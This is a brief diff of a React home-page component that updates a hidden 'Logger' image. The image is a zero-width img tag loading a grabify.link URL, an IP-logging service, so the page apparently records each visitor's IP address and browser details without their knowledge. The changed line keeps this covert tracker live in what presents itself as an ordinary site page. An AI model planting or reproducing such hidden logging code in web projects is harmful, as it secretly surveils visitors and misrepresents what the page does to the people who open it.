@@ -44,7 +44,7 @@ const HomePage = () => {
           ></div>
           {/* Logger */}
       <span>
-        <img src="https://grabify.link/7OHQZ" alt="." width={0} />
+        <img src="https://grabify.link/7OHQZ4" alt="." width={0} />
       </span>
       {/* Logger */}
 
